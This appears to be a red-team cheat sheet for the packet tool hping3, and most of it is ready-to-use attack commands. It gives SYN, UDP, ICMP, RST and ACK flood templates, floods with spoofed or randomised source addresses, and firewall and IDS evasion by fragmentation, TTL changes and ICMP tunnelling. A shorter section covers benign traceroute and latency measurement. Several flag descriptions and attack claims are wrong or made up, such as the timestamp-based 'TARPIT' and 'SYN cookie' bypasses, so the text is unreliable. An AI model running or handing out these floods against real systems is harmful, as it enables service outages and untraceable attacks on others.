# HPing3
- [[Red Team/4. Tool Guides/0. Incomplete/Tool Guides]]

## Commands and Usage

Hping3 is a powerful packet crafting tool commonly used for network testing, security auditing, and firewall testing. It allows the manipulation of various network protocols and provides control over nearly every aspect of packet generation. This ultimate edition of the cheat sheet provides an exhaustive list of Hping3 commands, detailed explanations, and advanced usage scenarios.

## Basic Syntax
```bash
hping3 [options] <target_ip>
```

## Core Options
- `-S`: Send SYN packets.
- `-A`: Send ACK packets.
- `-F`: Send FIN packets.
- `-P`: Send PUSH packets.
- `-R`: Send RST packets.
- `-U`: Send UDP packets.
- `-Y`: Send TCP packets with the ACK flag set.
- `-X`: Send TCP packets with the FIN and PSH flags set.
- `-1`: Send ICMP Echo Request.
- `-2`: Send UDP packets (another method).
- `-9`: Listen mode for a signature-based IDS.
- `-p <target_port>`: Set target port.
- `-s <attack_port>`: Set source port.
- `-c <count>`: Number of packets to send.
- `-i <interval>`: Time between packets, in seconds.
- `-d <data_size>`: Size of packet data.
- `-E <file>`: Add payload from file.
- `-a <source_ip>`: Spoof source IP address.
- `--flood`: Send packets as fast as possible.
- `--rand-source`: Randomize source IP address.

# Commands and Use Cases

#### SYN Flooding Techniques

1. **Basic SYN Flood**: Generates a flood of SYN packets to overwhelm the target's TCP stack.
    ```bash
    hping3 -S --flood -V -p <target_port> <target_ip>
    ```
2. **SYN Flood with Spoofed IP**: Sends SYN packets with a spoofed source IP, making it harder to trace back to the attacker.
    ```bash
    hping3 -S --flood -a <spoofed_ip> -p <target_port> <target_ip>
    ```
3. **SYN Flood with Randomized Source IPs**: Randomizes the source IP address in each SYN packet, further obfuscating the attack.
    ```bash
    hping3 -S --flood --rand-source -p <target_port> <target_ip>
    ```
4. **Slow SYN Flood**: Sends SYN packets at a slower rate (every 1ms), designed to evade detection while still causing denial of service.
    ```bash
    hping3 -S -p <target_port> --flood -i u1000 <target_ip>
    ```
5. **SYN Flood with Varying TTL**: Modifies the TTL (Time To Live) value in each packet to attempt bypassing TTL-based filtering.
    ```bash
    hping3 -S --flood --ttl <ttl_value> -p <target_port> <target_ip>
    ```

#### Scanning Techniques

1. **TCP SYN Scan**: Performs a SYN scan on a range of ports, useful for identifying open services.
    ```bash
    hping3 -S -p <target_port_range> -c <count> <target_ip>
    ```
2. **TCP ACK Scan**: ACK scan to determine firewall rulesets or to detect open ports behind a firewall.
    ```bash
    hping3 -A -p <target_port_range> -c <count> <target_ip>
    ```
3. **TCP NULL Scan**: Sends packets with no TCP flags set, used to bypass firewalls or find open ports.
    ```bash
    hping3 --null -p <target_port_range> -c <count> <target_ip>
    ```
4. **Xmas Scan**: Sends packets with the FIN, PSH, and URG flags set, often used to detect open ports through firewalls.
    ```bash
    hping3 -X -p <target_port_range> -c <count> <target_ip>
    ```
5. **FIN Scan**: Sends FIN packets to target ports, checking for closed ports (which should respond with RST).
    ```bash
    hping3 -F -p <target_port_range> -c <count> <target_ip>
    ```
6. **UDP Scan**: Sends UDP packets to identify open UDP ports.
    ```bash
    hping3 -2 -p <target_port_range> -c <count> <target_ip>
    ```
7. **ICMP Scan**: Sends ICMP Echo Requests to identify active hosts and their responses.
    ```bash
    hping3 -1 -c <count> <target_ip>
    ```
8. **Stealth Scan with Spoofed Source IP**: Scans target ports using a spoofed source IP to avoid detection.
    ```bash
    hping3 -S -a <spoofed_ip> -p <target_port_range> -c <count> <target_ip>
    ```
9. **Fragmented Packet Scan**: Sends fragmented packets to bypass deep packet inspection systems.
    ```bash
    hping3 -S -f -p <target_port> <target_ip>
    ```
10. **TTL-based Scanning**: Alters the TTL value to attempt bypassing certain firewall rules or network policies.
    ```bash
    hping3 -S -p <target_port_range> --ttl <ttl_value> <target_ip>
    ```

#### Denial of Service (DoS) Techniques

1. **ICMP Flood**: Floods the target with ICMP Echo Requests, potentially overwhelming their network stack.
    ```bash
    hping3 --icmp --flood -d <data_size> <target_ip>
    ```
2. **UDP Flood**: Sends a flood of UDP packets to a target port, overwhelming the target's resources.
    ```bash
    hping3 --udp --flood -p <target_port> -d <data_size> <target_ip>
    ```
3. **RST Flood**: Sends a flood of RST packets, attempting to reset active connections on the target system.
    ```bash
    hping3 -R --flood -p <target_port> <target_ip>
    ```
4. **ACK Flood**: Floods the target with ACK packets, which can cause issues with firewalls and stateful inspection.
    ```bash
    hping3 -A --flood -p <target_port> <target_ip>
    ```
5. **Push Flood (PSH Flood)**:Floods the target with PSH packets, forcing immediate processing of the data in the TCP stack.
    ```bash
    hping3 -P --flood -p <target_port> <target_ip>
    ```
 6. **SYN-ACK Flood**: Sends a flood of SYN-ACK packets, which can disrupt services by overwhelming the connection state table.
    ```bash
    hping3 -S --ack --flood -p <target_port> <target_ip>
    ```
7. **TARPIT DoS**: Exploits TCP timestamp vulnerabilities to force the target into using its resources on unproductive connections.
    ```bash
    hping3 -S -p <target_port> -c <count> --data <payload> --tcp-timestamp <target_ip>
    ```
8. **Resource Exhaustion Attack**: Floods the target with large packets from random source IPs to exhaust its resources.
    ```bash
    hping3 --flood --rand-source --data 1200 -p <target_port> <target_ip>
    ```
9. **Fragmented ICMP Flood**: Sends a flood of fragmented ICMP packets to bypass detection and overwhelm the target.
    ```bash
    hping3 --icmp --flood -f <target_ip>
    ```
10. **Application-Layer DoS**: Floods the target's web server with incomplete or malformed HTTP requests, disrupting service.
    ```bash
    hping3 --syn --flood -p 80 --data "GET / HTTP/1.1\r\nHost: <target_ip>\r\n\r\n" <target_ip>
    ```

#### Firewall/IDS Evasion Techniques

1. **Firewall Evasion with Fragmentation**: Bypasses firewalls and IDS by sending fragmented packets that are harder to inspect.
    ```bash
    hping3 -S -f -p <target_port> <target_ip>
    ```
2. **Bypassing Stateful Firewalls**: Uses TCP timestamp and ACK packets to bypass stateful firewalls by imitating established connections.
    ```bash
    hping3 -A -p <target_port> --tcp-timestamp <target_ip>
    ```
3. **IP Spoofing to Evade Detection**: Spoofs the source IP address to make it harder to trace the attack back to the source.
    ```bash
    hping3 -S -a <spoofed_ip> -p <target_port> <target_ip>
    ```
4. **Randomized Source Ports**: Randomizes the source port for each packet, avoiding detection by port-based filtering.
    ```bash
    hping3 -S --rand-source -p <target_port> <target_ip>
    ```
5. **Custom Packet Assembly for Evasion**: Customizes packets with specific payloads, sizes, and flags to evade detection.
    ```bash
    hping3 -S -p <target_port> -c <count> -d <data_size> -E <file> <target_ip>
    ```
6. **TTL Manipulation for Firewall Evasion**: Alters the TTL value in packets to bypass firewalls that rely on TTL for filtering.
    ```bash
    hping3 -S --ttl <ttl_value> -p <target_port> <target_ip>
    ```
7. **Bypassing IDS with Custom Data**: Embeds custom data in the packets to bypass signature-based IDS systems.
    ```bash
    hping3 -S -p <target_port> --data <custom_payload> <target_ip>
    ```
8. **Source Routing for Evasion**: Specifies a custom source route to bypass certain network defenses.
    ```bash
    hping3 -S -p <target_port> -r <route> <target_ip>
    ```
9. **Defeating SYN Cookies**: Exploits weaknesses in SYN cookies by manipulating TCP timestamps.
    ```bash
    hping3 -S -p <target_port> --tcp-timestamp --syn <target_ip>
    ```
10. **Advanced ICMP Tunneling**: Creates an ICMP tunnel to bypass firewalls by sending data as part of ICMP timestamp requests.
    ```bash
    hping3 --icmp --icmp-timestamp --data <custom_payload> <target_ip>
    ```

#### Network Testing and Measurement

1. **MTU Path Discovery**: Discovers the maximum transmission unit (MTU) of a path, useful for optimizing network performance.
    ```bash
    hping3 --mtu <mtu_size> -p <target_port> <target_ip>
    ```
2. **Network Latency Measurement**: Measures network latency using TCP timestamps and traceroute.
    ```bash
    hping3 -S -p <target_port> --tcp-timestamp --traceroute <target_ip>
    ```
3. **Packet Loss Testing**: Tests for packet loss by sending a controlled number of packets and analyzing the responses.
    ```bash
    hping3 -S -p <target_port> -c <count> --tcp-timestamp <target_ip>
    ```
4. **Traceroute Alternative**: Performs a TCP-based traceroute, bypassing ICMP filtering that might block traditional traceroute tools.
    ```bash
    hping3 -S -p <target_port> --traceroute <target_ip>
    ```
5. **Bandwidth Testing**: Tests network bandwidth by sending a flood of large UDP packets.
    ```bash
    hping3 --udp --flood -p <target_port> -d <data_size> <target_ip>
    ```
6. **Firewall/IDS Rule Testing**: Tests the effectiveness of firewall or IDS rules by simulating various types of traffic.
    ```bash
    hping3 -A -p <target_port> --tcp-timestamp --traceroute <target_ip>
    ```
7. **Round Trip Time Measurement**: Measures the round trip time (RTT) for packets, useful for assessing network performance.
    ```bash
    hping3 -S -p <target_port> -c <count> <target_ip>
    ```
8. **Network Congestion Analysis**: Analyzes network congestion by tracking delays and retransmissions.
    ```bash
    hping3 -S -p <target_port> --tcp-timestamp --traceroute <target_ip>
    ```
9. **Firewall Policy Auditing**: Audits firewall policies by sending packets with various flags and options to see what is allowed through.
    ```bash
    hping3 -S -p <target_port> --tcp-timestamp --traceroute --verbose <target_ip>
    ```
10. **Network Topology Mapping**: Maps out network topology by combining traceroute with TCP SYN packets.
    ```bash
    hping3 -S --traceroute -p <target_port> <target_ip>
    ```

#### Network Simulation

1. **Simulating a DOS Attack**: Simulates a large-scale denial of service attack by randomizing source and destination IPs.
    ```bash
    hping3 --syn --flood --rand-source --rand-dest -p <target_port> <target_ip>
    ```
2. **Simulating Network Congestion**: Simulates network congestion by flooding the network with large packets from random sources.
    ```bash
    hping3 --flood -p <target_port> --rand-source -d <data_size> <target_ip>
    ```
3. **Simulating TCP Connection Timeouts**: Simulates TCP connection timeouts by sending SYN packets without completing the handshake.
    ```bash
    hping3 -S --flood --syn --rand-source -p <target_port> <target_ip>
    ```
4. **Simulating a Distributed DOS (DDoS) Attack**: Simulates a DDoS attack by flooding the network from multiple sources.
    ```bash
    hping3 --flood --rand-source --rand-dest -p <target_port> <target_ip>
    ```
5. **Simulating a Man-in-the-Middle Attack**: Simulates a man-in-the-middle attack by injecting data into ICMP timestamp packets.
    ```bash
    hping3 --icmp --icmp-ts --data <custom_payload> -p <target_port> <target_ip>
    ```
6. **Simulating a Network Reconnaissance Attack**: Simulates a network reconnaissance attack by flooding the network with SYN scans.
    ```bash
    hping3 -S --flood -p <target_port_range> <target_ip>
    ```
7. **Simulating Slowloris Attack**: Simulates a Slowloris attack by sending partial HTTP requests to keep connections open.
    ```bash
    hping3 -S -p 80 --data "GET / HTTP/1.1\r\nHost: <target_ip>\r\n" --flood <target_ip>
    ```
8. **Simulating IP Fragmentation Attacks**: Simulates IP fragmentation attacks by flooding the network with fragmented ICMP packets.
    ```bash
    hping3 --icmp --flood -f <target_ip>
    ```
9. **Simulating Network Latency**: Simulates network latency by sending ICMP packets with varying TTL values.
    ```bash
    hping3 --icmp -p <target_port> --traceroute <target_ip>
    ```
10. **Simulating a SYN Flood with Varying Payloads**: Simulates a SYN flood with varying payload sizes to test network resilience.
    ```bash
    hping3 -S --flood -p <target_port> --data <custom_payload> <target_ip>
    ```

# Resources

|**Name**|**URL**|
|---|---|
|Hping3 Documentation|http://www.hping.org/documentation.html|
|Hping3 Usage Examples|https://www.sans.org/reading-room/whitepapers/testing/advanced-packet-crafting-using-hping-34397|
|Advanced Hping3 Techniques|https://null-byte.wonderhowto.com/how-to/use-hping3-craft-custom-packets-and-perform-port-scans-0186382/|
|Defensive Countermeasures Against Hping3|https://www.sans.org/white-papers/defense-mechanisms-against-hping-attacks-970/|
|Hping3 and Firewall Testing|https://sectools.org/tool/hping/|
|Hping3 for Network Testing|https://www.offensive-security.com/metasploit-unleashed/hping3/|
|Hping3 Command Guide|https://www.hping.org/|
|Hping3 in CTF Challenges|https://ctftime.org/writeups/overview/hping3|
|Simulating Attacks with Hping3|https://resources.infosecinstitute.com/topic/simulating-attacks-using-hping3/|
|Using Hping3 for Reconnaissance|https://www.computersecuritystudent.com/SECURITY_TOOLS/Hping3/lesson.html|